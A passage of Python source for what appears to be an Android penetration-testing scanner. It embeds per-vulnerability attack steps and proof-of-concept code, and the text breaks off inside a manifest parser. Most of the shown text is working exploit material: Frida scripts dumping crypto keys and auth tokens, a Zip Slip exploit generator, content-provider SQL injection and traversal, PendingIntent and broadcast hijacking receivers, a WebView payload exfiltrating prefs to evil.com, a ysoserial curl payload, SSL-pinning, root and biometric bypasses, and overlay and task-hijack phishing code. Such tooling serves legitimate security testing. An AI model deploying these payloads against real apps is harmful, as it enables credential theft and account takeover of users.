     "poc":"// Frida: hook all command execution + inject test payload\nJava.perform(function() {\n    var Runtime = Java.use('java.lang.Runtime');\n    // Hook exec(String)\n    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n        console.log('[CMD-EXEC] ' + cmd);\n        // Test: append safe canary command\n        var result = this.exec(cmd);\n        return result;\n    };\n    // Hook exec(String[])\n    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdArray) {\n        console.log('[CMD-EXEC-ARRAY] ' + cmdArray.join(' '));\n        return this.exec(cmdArray);\n    };\n    // Hook ProcessBuilder\n    var PB = Java.use('java.lang.ProcessBuilder');\n    PB.start.implementation = function() {\n        var cmd = this.command().toString();\n        console.log('[PROCESS-BUILDER] ' + cmd);\n        return this.start();\n    };\n    console.log('[*] Command execution hooks installed');\n});"},
    {"vuln":"Weak Crypto","tool":"Frida, JADX",
     "steps":"1. Hook Cipher.getInstance to detect DES/RC4/ECB:\n   frida -U -f <package> -l crypto_hook.js\n2. Identify weak algorithms in decompiled code:\n   grep -rn 'DES\\|RC4\\|ECB' output/\n3. Extract encrypted data + key from memory:\n   Use Frida to hook SecretKeySpec constructor, dump key bytes\n4. Decrypt offline:\n   openssl enc -des-ecb -d -K <hex_key> -in encrypted.bin\n5. If ECB mode: look for visual patterns in encrypted images\n   (identical plaintext blocks = identical ciphertext blocks)",
     "poc":"// Frida: intercept all crypto operations, dump keys + plaintext\nJava.perform(function() {\n    var Cipher = Java.use('javax.crypto.Cipher');\n    Cipher.getInstance.overload('java.lang.String').implementation = function(algo) {\n        console.log('[CRYPTO] Algorithm: ' + algo);\n        if (/DES|RC4|ECB/i.test(algo)) console.log('[!!! WEAK] ' + algo);\n        return this.getInstance(algo);\n    };\n    Cipher.doFinal.overload('[B').implementation = function(input) {\n        console.log('[CRYPTO-INPUT] ' + bytesToHex(input));\n        var output = this.doFinal(input);\n        console.log('[CRYPTO-OUTPUT] ' + bytesToHex(output));\n        return output;\n    };\n    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');\n    SKS.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {\n        console.log('[KEY] Algorithm: ' + algo + ' Key: ' + bytesToHex(key));\n        return this.$init(key, algo);\n    };\n    function bytesToHex(bytes) {\n        var hex = [];\n        for (var i = 0; i < bytes.length; i++) hex.push(('0'+((bytes[i]&0xFF).toString(16))).slice(-2));\n        return hex.join('');\n    }\n});"},
    {"vuln":"Hardcoded Crypto Key","tool":"Frida, JADX, CyberChef",
     "steps":"1. Find SecretKeySpec in decompiled code:\n   grep -rn 'SecretKeySpec' output/\n2. Extract the hardcoded key string\n3. Hook SecretKeySpec to dump runtime key:\n   frida -U -f <package> -l key_dump.js\n4. Use CyberChef to decrypt data:\n   AES Decrypt > Key: <extracted_key> > Mode: ECB/CBC\n5. If key is in resources/assets, extract directly:\n   apktool d target.apk && find . -name '*.key' -o -name '*.pem'",
     "poc":"// Frida: dump hardcoded crypto keys at runtime\nJava.perform(function() {\n    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');\n    SKS.$init.overload('[B', 'java.lang.String').implementation = function(keyBytes, algorithm) {\n        var key = '';\n        for (var i = 0; i < keyBytes.length; i++) {\n            key += String.fromCharCode(keyBytes[i] & 0xFF);\n        }\n        console.log('[CRITICAL] Hardcoded Key Captured!');\n        console.log('  Algorithm: ' + algorithm);\n        console.log('  Key (ASCII): ' + key);\n        console.log('  Key (Hex): ' + bytesToHex(keyBytes));\n        console.log('  Key (Base64): ' + Java.use('android.util.Base64').encodeToString(keyBytes, 0));\n        return this.$init(keyBytes, algorithm);\n    };\n    function bytesToHex(b){var h=[];for(var i=0;i<b.length;i++)h.push(('0'+((b[i]&0xFF).toString(16))).slice(-2));return h.join('');}\n});"},
    {"vuln":"Deeplink Hijack","tool":"adb, drozer, custom app",
     "steps":"1. Extract schemes from manifest:\n   aapt dump xmltree target.apk AndroidManifest.xml | grep -A5 'scheme'\n2. Test deeplink handling:\n   adb shell am start -a android.intent.action.VIEW -d 'scheme://host/path?param=<script>alert(1)</script>'\n3. Check for parameter injection:\n   adb shell am start -d 'myapp://auth/callback?token=stolen_token&redirect=https://evil.com'\n4. Build malicious app that registers same scheme:\n   Register identical intent-filter to intercept deeplinks\n5. Open redirect via deeplink:\n   adb shell am start -d 'myapp://webview?url=https://evil.com/phishing'",
     "poc":"// Malicious app manifest to hijack deeplinks:\n// <intent-filter>\n//   <action android:name=\"android.intent.action.VIEW\"/>\n//   <category android:name=\"android.intent.category.DEFAULT\"/>\n//   <category android:name=\"android.intent.category.BROWSABLE\"/>\n//   <data android:scheme=\"myapp\" android:host=\"auth\"/>\n// </intent-filter>\n//\n// When user clicks myapp://auth/callback?token=xxx\n// Android shows chooser -> attacker app steals token\n\n// Frida: monitor all incoming intents\nJava.perform(function() {\n    var Activity = Java.use('android.app.Activity');\n    Activity.onNewIntent.implementation = function(intent) {\n        console.log('[DEEPLINK] ' + intent.getData().toString());\n        console.log('[EXTRAS] ' + intent.getExtras());\n        this.onNewIntent(intent);\n    };\n});"},
    {"vuln":"Mutable PendingIntent","tool":"adb, custom exploit app",
     "steps":"1. Find PendingIntent without FLAG_IMMUTABLE in code:\n   grep -rn 'PendingIntent.get' output/ | grep -v 'FLAG_IMMUTABLE'\n2. Build exploit app to intercept:\n   Register matching IntentFilter\n   When PendingIntent fires, attacker app modifies extras\n3. Privilege escalation:\n   Mutable PendingIntent allows attacker to change target component\n   Redirect intent to internal non-exported activities\n4. Notification hijack:\n   Intercept notification PendingIntents to steal tap actions",
     "poc":"// Exploit app code: hijack mutable PendingIntent\n// 1. Attacker app registers receiver matching the implicit intent\n// 2. When PendingIntent fires, Android delivers to attacker\n// 3. Attacker modifies and re-sends with elevated privileges\n\n// In attacker's BroadcastReceiver:\npublic void onReceive(Context ctx, Intent intent) {\n    // Original PendingIntent arrived — steal data\n    String token = intent.getStringExtra(\"auth_token\");\n    Log.d(\"EXPLOIT\", \"Stolen token: \" + token);\n    // Modify and forward to escalate privileges\n    intent.setComponent(new ComponentName(\"com.target\", \"com.target.AdminActivity\"));\n    intent.putExtra(\"role\", \"admin\");\n    ctx.startActivity(intent);\n}"},
    {"vuln":"Content Provider Injection","tool":"drozer, adb, Frida",
     "steps":"1. Find injectable providers:\n   dz> run scanner.provider.injection -a <package>\n2. SQL injection via content URI:\n   adb shell content query --uri content://<pkg>.provider/data --where \"1=1) UNION SELECT sql,2,3 FROM sqlite_master--\"\n3. Path traversal on file providers:\n   adb shell content read --uri content://<pkg>.fileprovider/../../../../etc/passwd\n4. Insert malicious data:\n   adb shell content insert --uri content://<pkg>.provider/users --bind name:s:admin --bind role:s:superuser",
     "poc":"#!/bin/bash\n# Content provider injection scanner\nPKG=$1\necho \"[*] Testing content providers for $PKG\"\n# Get all provider authorities\nfor auth in $(adb shell dumpsys package $PKG | grep -oP '(?<=authority=)[\\w.]+'); do\n    URI=\"content://$auth/\"\n    echo \"\\n[+] Testing: $URI\"\n    # Basic query\n    adb shell content query --uri $URI 2>/dev/null | head -3\n    # SQL injection\n    adb shell content query --uri $URI --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\" 2>/dev/null | head -3\n    # Path traversal\n    adb shell content read --uri \"${URI}../../../../etc/hosts\" 2>/dev/null | head -3\ndone"},
    {"vuln":"Zip Path Traversal","tool":"custom Python script",
     "steps":"1. Find ZipEntry.getName() usage without validation in code\n2. Craft malicious ZIP with traversal entries:\n   python3 -c \"import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../data/data/<pkg>/shared_prefs/evil.xml','<pwned/>'); z.close()\"\n3. Send to app via intent/download\n4. App extracts and overwrites arbitrary files\n5. Overwrite shared_prefs to inject session tokens\n6. Overwrite DEX files for code execution",
     "poc":"#!/usr/bin/env python3\n# Zip Slip exploit generator\nimport zipfile, sys, io\n\ntarget_pkg = sys.argv[1] if len(sys.argv) > 1 else 'com.target.app'\noutput = 'zipslip_exploit.zip'\n\nwith zipfile.ZipFile(output, 'w') as zf:\n    # Overwrite SharedPreferences to inject admin session\n    payload_prefs = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<map>\n    <string name=\"session_token\">ATTACKER_ADMIN_TOKEN</string>\n    <string name=\"role\">admin</string>\n    <boolean name=\"authenticated\" value=\"true\"/>\n</map>'''\n    zf.writestr(\n        f'../../../../../data/data/{target_pkg}/shared_prefs/auth_prefs.xml',\n        payload_prefs\n    )\n    # Overwrite native lib for code execution\n    zf.writestr(\n        f'../../../../../data/data/{target_pkg}/lib/libpayload.so',\n        b'\\x7fELF'  # ELF header placeholder\n    )\nprint(f'[+] Zip Slip exploit written to {output}')"},
    {"vuln":"Fragment Injection","tool":"adb, drozer",
     "steps":"1. Find PreferenceActivity subclasses:\n   grep -rn 'extends PreferenceActivity' output/\n2. Check if isValidFragment() returns true for all:\n   grep -A3 'isValidFragment' output/\n3. Launch with arbitrary fragment:\n   adb shell am start -n <pkg>/.SettingsActivity --es ':android:show_fragment' 'com.target.internal.AdminFragment'\n4. Inject system fragments:\n   adb shell am start -n <pkg>/.SettingsActivity --es ':android:show_fragment' 'com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment'",
     "poc":"#!/bin/bash\n# Fragment injection exploit\nPKG=$1\nACTIVITY=$2  # e.g., .SettingsActivity\n\n# Try injecting internal fragments\nFRAGMENTS=(\n    \"com.target.internal.AdminFragment\"\n    \"com.target.debug.DebugFragment\"\n    \"com.android.settings.ChooseLockPassword\\$ChooseLockPasswordFragment\"\n    \"com.android.settings.wifi.WifiSettings\"\n)\n\nfor frag in \"${FRAGMENTS[@]}\"; do\n    echo \"[*] Injecting: $frag\"\n    adb shell am start -n $PKG/$ACTIVITY \\\n        --es ':android:show_fragment' \"$frag\" \\\n        --es ':android:show_fragment_title' 'Injected' 2>/dev/null\n    sleep 1\ndone"},
    {"vuln":"Firebase Misconfiguration","tool":"curl, Firebase Scanner",
     "steps":"1. Extract Firebase URL from decompiled code:\n   grep -rn 'firebaseio.com' output/\n2. Test for open read access:\n   curl https://<project>.firebaseio.com/.json\n3. Test for open write access:\n   curl -X PUT -d '{\"exploit\":\"test\"}' https://<project>.firebaseio.com/test.json\n4. Enumerate collections:\n   curl https://<project>.firebaseio.com/users.json\n   curl https://<project>.firebaseio.com/orders.json\n5. Download entire database:\n   curl https://<project>.firebaseio.com/.json?shallow=true\n   Then iterate each key to dump full data",
     "poc":"#!/usr/bin/env python3\n# Firebase misconfiguration scanner\nimport urllib.request, json, sys\n\nfb_url = sys.argv[1]  # e.g., https://myproject.firebaseio.com\nprint(f'[*] Testing Firebase: {fb_url}')\n\n# Test open read\ntry:\n    resp = urllib.request.urlopen(f'{fb_url}/.json?shallow=true')\n    data = json.loads(resp.read())\n    print(f'[CRITICAL] Firebase is OPEN! Collections: {list(data.keys())}')\n    for key in list(data.keys())[:5]:\n        resp2 = urllib.request.urlopen(f'{fb_url}/{key}.json?limitToFirst=3')\n        print(f'  [{key}] {resp2.read().decode()[:200]}')\nexcept Exception as e:\n    if '401' in str(e) or '403' in str(e):\n        print('[+] Firebase properly secured')\n    else:\n        print(f'[?] Error: {e}')"},
    {"vuln":"WebView XSS","tool":"Frida, adb, Chrome DevTools",
     "steps":"1. Find addJavascriptInterface in decompiled code:\n   grep -rn 'addJavascriptInterface' output/\n2. Identify exposed interface name and methods\n3. Inject JS to call exposed methods:\n   adb shell am start -n <pkg>/.WebActivity --es url \"javascript:void(window.<interface>.sensitiveMethod('attacker_data'))\"\n4. Chain with file:// for local file read:\n   javascript:fetch('file:///data/data/<pkg>/databases/app.db').then(r=>r.blob()).then(b=>{/* exfiltrate */})\n5. If targetSdkVersion < 17: full RCE via reflection\n   <interface>.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id')",
     "poc":"// Frida: exploit addJavascriptInterface for data theft\nJava.perform(function() {\n    var WebView = Java.use('android.webkit.WebView');\n    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {\n        console.log('[WebView] Loading: ' + url);\n        this.loadUrl(url);\n        // Inject XSS payload after page loads\n        var self = this;\n        setTimeout(function() {\n            var xss = \"javascript:void(\" +\n                \"fetch('file:///data/data/\" + Java.use('android.app.ActivityThread').currentApplication().getPackageName() + \"/shared_prefs/auth.xml')\" +\n                \".then(r=>r.text())\" +\n                \".then(t=>fetch('https://evil.com/steal?data='+btoa(t)))\" +\n                \")\";\n            self.loadUrl(xss);\n        }, 3000);\n    };\n});"},
    {"vuln":"Unsafe Deserialization","tool":"Frida, ysoserial",
     "steps":"1. Find ObjectInputStream.readObject() in code:\n   grep -rn 'readObject\\|ObjectInputStream' output/\n2. Identify what classes are deserialized\n3. Check classpath for gadget chains (Apache Commons, Spring, etc.)\n4. Generate payload:\n   java -jar ysoserial.jar CommonsCollections6 'curl https://evil.com/pwned' > payload.ser\n5. Deliver via intent extras, file, or network\n6. Hook readObject to confirm execution:\n   frida -U -f <pkg> -l deserialize_hook.js",
     "poc":"// Frida: monitor and exploit deserialization\nJava.perform(function() {\n    var OIS = Java.use('java.io.ObjectInputStream');\n    OIS.readObject.implementation = function() {\n        var obj = this.readObject();\n        console.log('[DESERIALIZE] Class: ' + obj.getClass().getName());\n        console.log('[DESERIALIZE] toString: ' + obj.toString().substring(0, 200));\n        return obj;\n    };\n    console.log('[*] Deserialization hook installed');\n});"},
    {"vuln":"Dynamic Code Loading","tool":"Frida, file monitor",
     "steps":"1. Find DexClassLoader/PathClassLoader in code:\n   grep -rn 'DexClassLoader\\|PathClassLoader\\|loadDex' output/\n2. Monitor loaded DEX files:\n   inotifywait -m /data/data/<pkg>/ -e create -e modify | grep .dex\n3. Hook class loader with Frida to intercept loaded classes\n4. Replace DEX on disk before loading:\n   adb shell cp /sdcard/evil.dex /data/data/<pkg>/app_dex/plugin.dex\n5. If loaded from network: MITM to replace DEX in transit",
     "poc":"// Frida: intercept dynamic class loading\nJava.perform(function() {\n    var DexClassLoader = Java.use('dalvik.system.DexClassLoader');\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libPath, parent) {\n        console.log('[!] DexClassLoader loading: ' + dexPath);\n        console.log('    optimizedDir: ' + optimizedDir);\n        // Could replace dexPath with malicious DEX here\n        return this.$init(dexPath, optimizedDir, libPath, parent);\n    };\n    var PathClassLoader = Java.use('dalvik.system.PathClassLoader');\n    PathClassLoader.$init.overload('java.lang.String', 'java.lang.ClassLoader').implementation = function(path, parent) {\n        console.log('[!] PathClassLoader: ' + path);\n        return this.$init(path, parent);\n    };\n});"},
    {"vuln":"Broadcast Theft","tool":"adb, drozer, custom receiver",
     "steps":"1. Find sendBroadcast with implicit intents in code:\n   grep -rn 'sendBroadcast' output/\n2. Register receiver for the action:\n   adb shell am broadcast -a <package>.ACTION_DATA_SYNC\n3. Build sniffing app:\n   Register BroadcastReceiver for the implicit action\n   Log all extras: intent.getExtras().keySet() + values\n4. Intercept sensitive broadcasts:\n   OTP codes, auth tokens, sync data, payment confirmations",
     "poc":"// Malicious receiver app to steal implicit broadcasts\n// AndroidManifest.xml:\n// <receiver android:name=\".Sniffer\" android:exported=\"true\">\n//   <intent-filter android:priority=\"999\">\n//     <action android:name=\"com.target.DATA_SYNC\"/>\n//     <action android:name=\"com.target.OTP_RECEIVED\"/>\n//     <action android:name=\"com.target.PAYMENT_COMPLETE\"/>\n//   </intent-filter>\n// </receiver>\n\npublic class Sniffer extends BroadcastReceiver {\n    public void onReceive(Context ctx, Intent intent) {\n        Log.d(\"STOLEN\", \"Action: \" + intent.getAction());\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            for (String key : extras.keySet()) {\n                Log.d(\"STOLEN\", key + \" = \" + extras.get(key));\n            }\n        }\n        // Forward to attacker server\n        // new Thread(() -> sendToServer(extras)).start();\n    }\n}"},
    {"vuln":"Insecure SharedPreferences","tool":"adb (root), Frida",
     "steps":"1. On rooted device, read world-readable prefs:\n   adb shell cat /data/data/<pkg>/shared_prefs/*.xml\n2. Check file permissions:\n   adb shell ls -la /data/data/<pkg>/shared_prefs/\n   MODE_WORLD_READABLE = -rw-rw-r-- (readable by any app)\n3. From any app on device:\n   open(\"/data/data/<pkg>/shared_prefs/auth.xml\").read()\n4. Extract tokens/passwords stored in plaintext",
     "poc":"// Frida: dump all SharedPreferences at runtime\nJava.perform(function() {\n    var SP = Java.use('android.app.SharedPreferencesImpl');\n    SP.getString.overload('java.lang.String', 'java.lang.String').implementation = function(key, defValue) {\n        var value = this.getString(key, defValue);\n        if (/token|password|secret|session|auth|key/i.test(key)) {\n            console.log('[SENSITIVE-PREF] ' + key + ' = ' + value);\n        }\n        return value;\n    };\n    // Dump entire prefs file\n    var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();\n    var prefsDir = ctx.getFilesDir().getParent() + '/shared_prefs/';\n    var files = Java.use('java.io.File').$new(prefsDir).listFiles();\n    if (files) {\n        for (var i = 0; i < files.length; i++) {\n            console.log('[PREFS-FILE] ' + files[i].getName());\n        }\n    }\n});"},
    {"vuln":"Clipboard Leak","tool":"Frida, adb",
     "steps":"1. Monitor clipboard in real-time:\n   adb shell service call clipboard 2 s16 com.android.shell\n2. Frida hook to capture all clipboard writes:\n   Hook ClipboardManager.setPrimaryClip\n3. Any app can read clipboard (pre-Android 10)\n4. If app copies passwords/tokens to clipboard,\n   a background malicious app steals them instantly",
     "poc":"// Frida: clipboard theft monitor\nJava.perform(function() {\n    var CM = Java.use('android.content.ClipboardManager');\n    CM.setPrimaryClip.implementation = function(clip) {\n        var text = clip.getItemAt(0).getText();\n        console.log('[CLIPBOARD-WRITE] ' + text);\n        this.setPrimaryClip(clip);\n    };\n    CM.getPrimaryClip.implementation = function() {\n        var clip = this.getPrimaryClip();\n        if (clip && clip.getItemCount() > 0) {\n            console.log('[CLIPBOARD-READ] ' + clip.getItemAt(0).getText());\n        }\n        return clip;\n    };\n    console.log('[*] Clipboard monitoring active');\n});"},
]

# ============================================================
#  BYPASS TECHNIQUES  (mapped to scanner findings)
# ============================================================
BYPASS_TECHNIQUES = [
    {"name":"SSL Pinning Bypass","category":"Network",
     "desc":"Bypass OkHttp/custom certificate pinning to intercept HTTPS.",
     "methods":"# Method 1: Frida + objection (universal, works on most apps)\nobjection -g <package> explore\n> android sslpinning disable\n\n# Method 2: Frida script for OkHttp3 CertificatePinner\nJava.perform(function() {\n    var CertPinner = Java.use('okhttp3.CertificatePinner');\n    CertPinner.check.overload('java.lang.String','java.util.List').implementation = function(host, certs) {\n        console.log('[BYPASS] SSL pin check skipped for: ' + host);\n    };\n    // Also bypass TrustManagerImpl\n    var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n    TMI.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log('[BYPASS] TrustManager chain verification skipped for: ' + host);\n        return untrustedChain;\n    };\n});\n\n# Method 3: Patch APK\napktool d target.apk\n# Edit res/xml/network_security_config.xml:\n# <trust-anchors><certificates src=\"user\"/></trust-anchors>\napktool b target -o patched.apk\njarsigner -keystore debug.keystore patched.apk androiddebugkey\n\n# Method 4: Magisk module\n# Install MagiskTrustUserCerts module\n# Moves user CA certs to system trust store"},
    {"name":"Root Detection Bypass","category":"Resilience",
     "desc":"Bypass SafetyNet/Play Integrity and custom root checks.",
     "methods":"# Method 1: Frida universal root bypass\nJava.perform(function() {\n    // Hook common root check methods\n    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');\n    RootBeer.isRooted.implementation = function() { return false; };\n    RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() { return false; };\n    \n    // Hook file existence checks\n    var File = Java.use('java.io.File');\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (/su$|magisk|supersu|busybox/i.test(path)) {\n            console.log('[ROOT-BYPASS] Hiding: ' + path);\n            return false;\n        }\n        return this.exists();\n    };\n    \n    // Hook Runtime.exec for 'which su'\n    var Runtime = Java.use('java.lang.Runtime');\n    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n        if (/which su|su -c/i.test(cmd)) {\n            console.log('[ROOT-BYPASS] Blocked: ' + cmd);\n            throw Java.use('java.io.IOException').$new('Permission denied');\n        }\n        return this.exec(cmd);\n    };\n    \n    // Hook Build.TAGS\n    var Build = Java.use('android.os.Build');\n    Build.TAGS.value = 'release-keys';\n});\n\n# Method 2: Magisk DenyList (formerly MagiskHide)\n# Settings > Magisk > DenyList > Enable > Add target app\n\n# Method 3: Shamiko (Magisk module for Zygisk)\n# Hides root from apps using DenyList"},
    {"name":"Biometric Authentication Bypass","category":"Auth",
     "desc":"Bypass fingerprint/face auth when CryptoObject is not bound.",
     "methods":"# If BiometricPrompt is used WITHOUT CryptoObject, authentication\n# result is purely boolean — trivially bypassable:\n\nJava.perform(function() {\n    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');\n    var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');\n    \n    // Find the callback and call onAuthenticationSucceeded directly\n    var callback = null;\n    BiometricPrompt.authenticate.overload(\n        'androidx.biometric.BiometricPrompt$PromptInfo'\n    ).implementation = function(info) {\n        console.log('[BIOMETRIC-BYPASS] Intercepted authenticate()');\n        // Trigger success callback without actual biometric\n        var result = AuthResult.$new(null); // null CryptoObject = no crypto binding\n        this.mAuthenticationCallback.value.onAuthenticationSucceeded(result);\n    };\n});\n\n# Method 2: objection\nobjection -g <package> explore\n> android hooking watch class androidx.biometric.BiometricPrompt\n\n# Method 3: ADB emulator fingerprint\nadb -e emu finger touch 1"},
    {"name":"Emulator Detection Bypass","category":"Resilience",
     "desc":"Run app on emulator despite anti-emulator checks.",
     "methods":"# Frida: spoof all emulator indicators\nJava.perform(function() {\n    var Build = Java.use('android.os.Build');\n    Build.FINGERPRINT.value = 'google/sailfish/sailfish:8.1.0/OPM1.171019.011/4448085:user/release-keys';\n    Build.MODEL.value = 'Pixel';\n    Build.MANUFACTURER.value = 'Google';\n    Build.BRAND.value = 'google';\n    Build.DEVICE.value = 'sailfish';\n    Build.PRODUCT.value = 'sailfish';\n    Build.HARDWARE.value = 'sailfish';\n    Build.BOARD.value = 'sailfish';\n    Build.HOST.value = 'wphr1.hot.corp.google.com';\n    \n    // Hide /dev/goldfish and /dev/qemu pipes\n    var File = Java.use('java.io.File');\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (/goldfish|qemu|nox|genymotion|vbox/i.test(path)) return false;\n        return this.exists();\n    };\n    \n    // Spoof telephony\n    var TelMgr = Java.use('android.telephony.TelephonyManager');\n    TelMgr.getDeviceId.implementation = function() { return '352099001761481'; };\n    TelMgr.getSubscriberId.implementation = function() { return '310260000000000'; };\n    TelMgr.getSimSerialNumber.implementation = function() { return '89014103211118510720'; };\n});"},
    {"name":"Debugger Detection Bypass","category":"Resilience",
     "desc":"Attach debugger/Frida despite anti-debug and anti-tamper.",
     "methods":"# Frida: bypass all debug detection\nJava.perform(function() {\n    // android.os.Debug.isDebuggerConnected\n    var Debug = Java.use('android.os.Debug');\n    Debug.isDebuggerConnected.implementation = function() { return false; };\n    \n    // TracerPid check in /proc/self/status\n    var BufferedReader = Java.use('java.io.BufferedReader');\n    BufferedReader.readLine.implementation = function() {\n        var line = this.readLine();\n        if (line && line.indexOf('TracerPid') !== -1) {\n            return 'TracerPid:\\t0';\n        }\n        return line;\n    };\n    \n    // ptrace self-defense bypass\n    // Must attach Frida BEFORE app calls ptrace(PT_DENY_ATTACH)\n    // Use: frida -U -f <package> --no-pause  (spawn mode)\n    \n    // ApplicationInfo.FLAG_DEBUGGABLE check\n    var AppInfo = Java.use('android.content.pm.ApplicationInfo');\n    AppInfo.flags.value &= ~2; // Clear FLAG_DEBUGGABLE\n});\n\n# Use Frida Gadget injection for apps with anti-Frida:\n# 1. apktool d target.apk\n# 2. Copy frida-gadget.so to lib/\n# 3. Inject System.loadLibrary('frida-gadget') in main activity\n# 4. Rebuild and sign"},
    {"name":"Tapjacking / Overlay Attack","category":"UI",
     "desc":"Overlay transparent window to hijack user taps on sensitive buttons.",
     "methods":"// Exploit app: overlay attack (requires SYSTEM_ALERT_WINDOW)\n// Works if target app does NOT set filterTouchesWhenObscured=\"true\"\n\n// AndroidManifest.xml:\n// <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>\n\n// OverlayService.java:\npublic void createOverlay() {\n    WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);\n    WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n        WindowManager.LayoutParams.MATCH_PARENT,\n        WindowManager.LayoutParams.MATCH_PARENT,\n        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE\n            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,  // pass touches through\n        PixelFormat.TRANSLUCENT\n    );\n    // Create invisible overlay that looks like target app's confirm button\n    View overlay = new View(this);\n    overlay.setBackgroundColor(Color.argb(1, 0, 0, 0)); // nearly transparent\n    wm.addView(overlay, params);\n    // User thinks they're tapping target app, but overlay captures coordinates\n}\n\n// Detection: check if filterTouchesWhenObscured is set\n// Frida: Java.use('android.view.View').getFilterTouchesWhenObscured.implementation = function(){return false;};"},
    {"name":"Intent Redirection / Task Hijacking","category":"Platform",
     "desc":"Hijack task stack to redirect user to phishing activity.",
     "methods":"// Task Hijacking (StrandHogg vulnerability pattern)\n// If target activity has taskAffinity set or launchMode=\"singleTask\"\n// attacker app can inject into the same task stack\n\n// Attacker app manifest:\n// <activity android:name=\".PhishingLogin\"\n//           android:taskAffinity=\"<target.package>\"\n//           android:excludeFromRecents=\"true\">\n//   <intent-filter>\n//     <action android:name=\"android.intent.action.MAIN\"/>\n//     <category android:name=\"android.intent.category.LAUNCHER\"/>\n//   </intent-filter>\n// </activity>\n\n// When user opens target app, attacker's activity is on top of task stack\n// User sees attacker's fake login screen instead of real app\n\n// Exploit via adb:\nadb shell am start -n <target>/.LoginActivity\n# Quick switch to inject:\nadb shell am start --activity-task-on-home -n <attacker>/.PhishingLogin\n\n// Frida: monitor task stack\nJava.perform(function() {\n    var AM = Java.use('android.app.ActivityManager');\n    // ... enumerate running tasks to verify injection\n});"},
]

# ============================================================
#  DATA
# ============================================================
class Finding:
    __slots__=("id","title","severity","cwe","owasp","file","line","evidence","desc","fix","cvss")
    def __init__(self,**kw):
        for k in self.__slots__: setattr(self,k,kw.get(k,""))
    def to_dict(self): return {k:getattr(self,k) for k in self.__slots__}

# ============================================================
#  PROPER AXML (Binary AndroidManifest) PARSER
# ============================================================
def _parse_axml(data):
    """Parse Android Binary XML and reconstruct readable XML."""
    if len(data) < 8:
        return _bin_xml_fallback(data)
    magic = struct.unpack_from("<I", data, 0)[0]
    if magic != 0x00080003:  # not AXML
        return _bin_xml_fallback(data)
    try:
        # Parse string pool
        sp_type = struct.unpack_from("<H", data, 8)[0]
        if sp_type != 0x0001:
            return _bin_xml_fallback(data)
        sp_size = struct.unpack_from("<I", data, 12)[0]
        str_count = struct.unpack_from("<I", data, 16)[0]
        str_off = struct.unpack_from("<I", data, 28)[0]
        flags = struct.unpack_from("<I", data, 24)[0]
        is_utf8 = (flags & (1 << 8)) != 0
        offsets = []
        for i in range(str_count):
            offsets.append(struct.unpack_from("<I", data, 36 + i * 4)[0])
        str_data_start = 8 + str_off
        strings = []
        for off in offsets:
            pos = str_data_start + off
            if pos >= len(data):
                strings.append("")
                continue
            if is_utf8:
                # skip ULEB128 char count and byte count
                pos += 1
                if pos < len(data) and data[pos] & 0x80:
                    pos += 1
                pos += 1
                if pos < len(data) and data[pos] & 0x80:
                    pos += 1
                end = data.find(0, pos)
                if end == -1: end = min(pos + 256, len(data))
                strings.append(data[pos:end].decode("utf-8", errors="replace"))
            else:
                char_len = struct.unpack_from("<H", data, pos)[0]
                pos += 2
                end = pos + char_len * 2
                if end > len(data): end = len(data)
                strings.append(data[pos:end].decode("utf-16-le", errors="replace"))
        # Reconstruct XML using string pool
        result = ['<?xml version="1.0" encoding="utf-8"?>']
        result.append("<!-- Reconstructed by {} -->".format(APP_NAME))
        # Build namespace map and tag structure from remaining chunks
        pos = 8 + sp_size
        indent = 0
        ns_map = {}
        while pos + 8 <= len(data):
            chunk_type = struct.unpack_from("<H", data, pos)[0]
            chunk_size = struct.unpack_from("<I", data, pos + 4)[0]
            if chunk_size < 8: break
            if chunk_type == 0x0100:  # START_NAMESPACE
                if pos + 24 <= len(data):
                    prefix_idx = struct.unpack_from("<I", data, pos + 16)[0]
                    uri_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    pf = strings[prefix_idx] if prefix_idx < len(strings) else ""
                    uri = strings[uri_idx] if uri_idx < len(strings) else ""
                    if pf: ns_map[uri] = pf
            elif chunk_type == 0x0102:  # START_TAG
                if pos + 28 <= len(data):
                    ns_idx = struct.unpack_from("<i", data, pos + 16)[0]
                    name_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    attr_count = struct.unpack_from("<H", data, pos + 28)[0]
                    tag = strings[name_idx] if name_idx < len(strings) else "?"
                    attrs = []
                    apos = pos + 36
                    for a in range(min(attr_count, 50)):
                        if apos + 20 > len(data): break
                        a_ns = struct.unpack_from("<i", data, apos)[0]
                        a_name = struct.unpack_from("<I", data, apos + 4)[0]
                        a_val_str = struct.unpack_from("<i", data, apos + 8)[0]
                        a_type = struct.unpack_from("<I", data, apos + 12)[0] >> 24
                        a_val = struct.unpack_from("<I", data, apos + 16)[0]
                        aname = strings[a_name] if a_name < len(strings) else "?"
                        # resolve prefix
                        if a_ns >= 0 and a_ns < len(strings):
                            ns_uri = strings[a_ns]
                            prefix = ns_map.get(ns_uri, "")
